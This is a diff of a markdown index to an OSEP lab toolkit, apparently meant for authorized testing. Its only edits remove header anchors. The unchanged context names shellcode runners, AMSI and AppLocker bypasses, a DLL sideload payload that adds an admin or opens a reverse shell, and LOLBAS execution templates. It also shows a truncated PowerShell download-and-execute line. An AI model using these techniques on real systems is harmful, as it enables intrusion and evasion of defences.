@@ -58,7 +58,7 @@ For the official OSEP labs/exam, or systems you are written-authorized to test. 
 | `m05-amsi-bypass-variants.ps1` | AMSI handling for PowerShell paths | See notes inside the script |
 
 
-#### `m13-xor-encoder.py` {#m13-xor-encoder-py}
+#### `m13-xor-encoder.py`
 
 ````python
 #!/usr/bin/env python3
@@ -167,7 +167,7 @@ if __name__ == "__main__":
     sys.exit(main())
 ````
 
-#### `m01-shellcode-runner-x64.cs` {#m01-shellcode-runner-x64-cs}
+#### `m01-shellcode-runner-x64.cs`
 
 ````csharp
 // Purpose: custom x64 shellcode Runner (precompile to avoid Add-Type dynamic compile landing temp files)
@@ -244,7 +244,7 @@ class Runner
 }
 ````
 
-#### `m05-amsi-bypass-variants.ps1` {#m05-amsi-bypass-variants-ps1}
+#### `m05-amsi-bypass-variants.ps1`
 
 ````powershell
 <#
@@ -421,7 +421,7 @@ if ($ProbeOnly) {
 | `m05-clm-bypass-runspace.ps1` | Managed in-memory exec fallback | See script |
 | `m05-amsi-bypass-variants.ps1` | AMSI handling for script paths | See script |
 
-#### `m05-clm-bypass-runspace.ps1` {#m05-clm-bypass-runspace-ps1}
+#### `m05-clm-bypass-runspace.ps1`
 
 ````powershell
 <#
@@ -558,7 +558,7 @@ Write-Output "    3) download-exec second stage: IEX (New-Object Net.WebClient).
 | `m05-installutil-runner.cs` | Managed assembly loader template | Replace assembly path/entry |
 | `m01-reflective-runner.ps1` | PowerShell reflective load | Replace DLL path and args |
 
-#### `m05-installutil-runner.cs` {#m05-installutil-runner-cs}
+#### `m05-installutil-runner.cs`
 
 ````csharp
 // Purpose: InstallUtil-compatible managed Runner — a .NET installer class InstallUtil.exe can invoke,
@@ -667,7 +667,7 @@ public class Runner : Installer
 }
 ````
 
-#### `m01-reflective-runner.ps1` {#m01-reflective-runner-ps1}
+#### `m01-reflective-runner.ps1`
 
 ````powershell
 <#
@@ -793,7 +793,7 @@ try {
 |---|---|---|
 | `m05-applocker-enum.ps1` | Enumerate effective rules + writable allow paths | `-PayloadPath` optional |
 
-#### `m05-applocker-enum.ps1` {#m05-applocker-enum-ps1}
+#### `m05-applocker-enum.ps1`
 
 ````powershell
 <#
@@ -947,7 +947,7 @@ x86_64-w64-mingw32-gcc -shared -o hijack.dll m04-proxy-dll-sideload.c proxy.def 
 | `m04-proxy-dll-newadmin.c` | DLL payload (add admin / reverse) | LHOST/LPORT |
 | `m04-build-sideload-package.py` | Pack host + DLL | Host version, arch |
 
-#### `m04-proxy-dll-sideload.c` {#m04-proxy-dll-sideload-c}
+#### `m04-proxy-dll-sideload.c`
 
 ````c
 /*
@@ -1035,7 +1035,7 @@ __declspec(dllexport) void CALLBACK Run(HWND hwnd, HINSTANCE hinst,
  */
 ````
 
-#### `m04-proxy-dll-newadmin.c` {#m04-proxy-dll-newadmin-c}
+#### `m04-proxy-dll-newadmin.c`
 
 ````c
 /*
@@ -1246,7 +1246,7 @@ __declspec(dllexport) void CALLBACK Run(HWND hwnd, HINSTANCE hinst,
 }
 ````
 
-#### `m04-build-sideload-package.py` {#m04-build-sideload-package-py}
+#### `m04-build-sideload-package.py`
 
 ````python
 #!/usr/bin/env python3
@@ -1481,7 +1481,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /out:pay
 | `m05-workflow-compiler-runner.cs` | Workflow host input assembly | Replace payload logic |
 | `m05-lolbas-notes.md` | Trusted-host quick reference | — |
 
-#### `m05-workflow-compiler-runner.cs` {#m05-workflow-compiler-runner-cs}
+#### `m05-workflow-compiler-runner.cs`
 
 ````csharp
 // Purpose: Workflow Compiler trusted host — assembly loaded and run by Microsoft.Workflow.Compiler.exe
@@ -1550,7 +1550,7 @@ namespace Payload
 }
 ````
 
-#### `m05-lolbas-notes.md` {#m05-lolbas-notes-md}
+#### `m05-lolbas-notes.md`
 
 ````markdown
 # Trusted-host quick reference (scenarios 21–24)
@@ -1655,7 +1655,7 @@ where mshta
 | `m05-xsl-exec.xsl` | XSL script-exec template | Replace LHOST/URL |
 | `m05-lolbas-notes.md` | Host invocation quick reference | — |
 
-#### `m05-xsl-exec.xsl` {#m05-xsl-exec-xsl}
+#### `m05-xsl-exec.xsl`
 
 ````xml
 <?xml version="1.0"?>
